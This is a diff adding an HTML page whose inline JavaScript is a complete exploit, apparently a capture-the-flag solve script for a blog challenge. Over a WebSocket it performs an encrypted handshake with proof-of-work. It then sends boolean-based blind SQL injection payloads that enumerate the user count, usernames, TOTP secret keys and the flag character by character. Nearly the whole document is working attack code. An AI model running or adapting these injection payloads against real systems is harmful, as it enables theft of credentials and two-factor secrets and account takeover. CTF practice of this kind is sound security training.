@@ -1,0 +1,215 @@
+<div id="logs">
+</div>
+<script src="bundle.js"></script> <!-- https://github.com/BirdsArentRealCTF/Blog-from-the-future/blob/master/index.js -->
+<script type="text/javascript">
+    const socket = new WebSocket(
+        "ws://challs.houseplant.riceteacatpanda.wtf:30003/ws"
+    );
+    const logs = document.getElementById("logs");
+    const key = randomBytes(32);
+    logMessage("aesKey", `Generated AES Key: ${key.toString("hex")}`);
+    const iv = randomBytes(16);
+    logMessage("aesIv", `Generated AES IV: ${iv.toString("hex")}`);
+    const AES = new aesjs.ModeOfOperation.cbc(key, iv);
+    const charset = "0123456789abcdef";
+    let userCount = 0;
+    let userNameLength = 0;
+    let user = "";
+    let userNameLengths = [];
+    let users = [];
+    let tokenLength = 0;
+    let token = "";
+    let tokens = [];
+    let flag = buffer.from("rtcp", "utf8").toString("hex");
+
+    const enumUserCount = (success = false) => {
+        if (!success) {
+            userCount += 1;
+            socket.send(
+                msgpack.encode([
+                    "getPost",
+                    `1 and (select count(*) from users) = ${userCount}`,
+                ])
+            );
+            logMessage("userCount", `Enumerating User Count ${userCount}`);
+        } else {
+            userCount = parseInt(/\= (.*)/.exec(success)[1]);
+            logMessage("userCount", `User Count ${userCount}`);
+            callback = enumUsernameLength;
+            callback();
+        }
+    };
+
+    let callback = enumUserCount;
+
+    const enumUsernameLength = (success = false) => {
+        if (!success) {
+            userNameLength += 1;
+            socket.send(
+                msgpack.encode([
+                    "getPost",
+                    `1 and (select length(username) from users LIMIT ${userNameLengths.length},1) = ${userNameLength}`,
+                ])
+            );
+            logMessage("usernameLength", `Enumerating Username Length ${userNameLength}`);
+        } else {
+            userNameLength = parseInt(/\= (.*)/.exec(success)[1]);
+            userNameLengths.push(userNameLength);
+            userNameLength = 0;
+            if (userNameLengths.length === userCount) {
+                logMessage("usernameLength", `Username Lengths ${userNameLengths.join(', ')}`);
+                callback = enumUsers;
+                callback(false, true);
+            } else {
+                enumUsernameLength();
+            }
+        }
+    };
+
+    const enumTokenLength = (success = false) => {
+        if (!success) {
+            tokenLength += 1;
+            logMessage("tokenLength", `Enumerating Token Length ${tokenLength}`);
+            socket.send(
+                msgpack.encode([
+                    "getPost",
+                    `1 and ((select length(totp_key) from users where username='${users[0]}') = ${tokenLength})`,
+                ])
+            );
+        } else {
+            tokenLength = parseInt(/\= (.*)\)/.exec(success)[1]);
+            logMessage("tokenLength", `Token Length ${tokenLength}`);
+            callback = enumToken;
+            callback(false, true);
+        }
+    };
+
+    const sendUserPayload = () => {
+        for (let i = 0; i < charset.length; i++) {
+            socket.send(
+                msgpack.encode([
+                    "getPost",
+                    `1 and ((select hex(username) from users LIMIT ${users.length},1) like '${user + charset[i]}%')`,
+                ])
+            );
+            logMessage("username", `Enumerating Username ${user}`);
+        }
+    };
+
+    const enumUsers = (success = false, firstCall = false) => {
+        firstCall && sendUserPayload();
+        if (success) {
+            user = /like '(.*)%'/.exec(success)[1];
+            if (user.length / 2 === userNameLengths[users.length]) {
+                users.push(aesjs.utils.utf8.fromBytes(buffer.from(user, "hex")));
+                user = "";
+                if (users.length === userCount) {
+                    logMessage("username", `Usernames ${users.join(", ")}`);
+                    callback = enumTokenLength;
+                    callback();
+                } else {
+                    enumUsers(false, true);
+                }
+            } else {
+                sendUserPayload();
+            }
+        }
+    };
+
+    const CalculatePOW = (h) => {
+        const e = h.toString("hex");
+        logMessage("powCalculating", `Calculating POW md5(X)[-${e.length}:] = ${e}`);
+        let i = "";
+        for (; !md5(i).endsWith(e);) i = randomBytes(8).toString("hex");
+        logMessage("powCalculated", `Calculated POW md5(${i})[-${e.length}:] = ${e}`);
+        return buffer.from(i, "hex");
+    };
+
+    const sendTokenPayload = () => {
+        for (let i = 0; i < charset.length; i++) {
+            socket.send(
+                msgpack.encode([
+                    "getPost",
+                    `1 and ((select hex(totp_key) from users LIMIT ${tokens.length},1) like '${token + charset[i]}%')`
+                ])
+            );
+            logMessage("token", `Enumerating Token ${token}`);
+        }
+    };
+
+    const enumToken = (success = false, firstCall = false) => {
+        firstCall && sendTokenPayload();
+        if (success) {
+            token = /like '(.*)%'/.exec(success)[1];
+            if (token.length / 2 === tokenLength) {
+                tokens.push(aesjs.utils.utf8.fromBytes(buffer.from(token, "hex")));
+                token = "";
+                if (tokens.length === users.length) {
+                    logMessage("token", `Tokens ${tokens.join(", ")}`);
+                    callback = enumFlag;
+                    callback(false, true);
+                } else {
+                    enumToken(false, true);
+                }
+            } else {
+                sendTokenPayload();
+            }
+        }
+    };
+
+    const sendFlagPayload = () => {
+        for (let i = 0; i < charset.length; i++) {
+            socket.send(
+                msgpack.encode([
+                    "getPost",
+                    `1 and ((select hex(group_concat(title) || group_concat(text)) from posts) like '%${flag + charset[i]}%')`
+                ])
+            );
+            logMessage("flag", `Enumerating Flag ${flag}`);
+        }
+    }
+
+    const enumFlag = (success = false, firstCall = false) => {
+        firstCall && sendFlagPayload();
+        if (success) {
+            flag = /\) like '%(.*)%'/.exec(success)[1];
+            if (aesjs.utils.utf8.fromBytes(buffer.from(flag, "hex")).substr(-1) === "}") {
+                callback = () => {};
+                logMessage("flag", `FLAG: ${aesjs.utils.utf8.fromBytes(buffer.from(flag, "hex"))}`);
+            } else {
+                sendFlagPayload();
+            }
+        }
+    };
+
+    socket.onopen = () => {
+        setInterval(() => {
+            socket.send("ÿ");
+            logMessage("keepAlive", `Keep Alive ${new Date().getTime()/1000}`);
+        }, 2e4);
+    };
+
+    socket.onmessage = (t) => {
+        "ÿ" !== t.data &&
+            t.data.arrayBuffer().then((t) => {
+                let msg = msgpack.decode(new Uint8Array(t));
+                if ("" === msg[0]) {
+                    const c = CalculatePOW(msg[1]);
+                    socket.send(msgpack.encode(["", key, iv, c]));
+                    logMessage("handshake", "Sending AES Key, Iv and POW");
+                    callback();
+                } else {
+                    if ("" === msg[0]) {
+                        parseMessage(msg[1]);
+                    }
+                }
+            });
+    };
+
+    const parseMessage = (t) => {
+        const msg = JSON.parse(
+            aesjs.utils.utf8.fromBytes(aesjs.padding.pkcs7.strip(AES.decrypt(t)))
+        );
+        callback(msg.length === 3 && msg[2].length !== 0 ? msg[1] : false);
+    };
+</script>
